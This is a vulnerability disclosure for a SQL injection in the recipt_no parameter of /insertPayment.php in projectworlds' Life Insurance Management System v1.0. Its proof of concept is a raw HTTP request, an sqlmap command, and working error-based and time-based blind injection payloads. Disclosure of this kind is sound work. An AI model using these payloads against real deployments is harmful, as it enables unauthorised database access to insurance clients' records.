# CVE-2025-6136

SQLi vulnerability in Life Insurance Management System v1.0 of file /insertPayment.php with param 'recipt_no'

**vender**:

- projectworlds

**SoftLink**:

- [Life Insurance Management System in PHP | Projectworlds](https://projectworlds.in/life-insurance-management-system-in-php/)

**Vulnerable File**

- /insertPayment.php

**Version**

- V1.0

### POC

```http
POST /insertPayment.php HTTP/1.1
Host: www.lims.top
Origin: http://www.lims.top
Referer: http://www.lims.top/addPayment.php
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=sqvuccn7rsiqr9bhq7p29tfds2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Priority: u=0, i
Content-Length: 64

recipt_no=8&client_id=8&month=8&amount=8&due=8&fine=8&agent_id=8
```



```bash
sqlmap -r request.txt -p recipt_no --batch
```



![image-20250531185730204](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505311857296.png)



```
---
Parameter: recipt_no (POST)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: recipt_no=8' AND GTID_SUBSET(CONCAT(0x716b627171,(SELECT (ELT(8489=8489,1))),0x71706b7071),8489) AND 'OAaO'='OAaO&client_id=8&month=8&amount=8&due=8&fine=8&agent_id=8

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: recipt_no=8' AND (SELECT 4473 FROM (SELECT(SLEEP(5)))FoAi) AND 'pqpy'='pqpy&client_id=8&month=8&amount=8&due=8&fine=8&agent_id=8
---
```





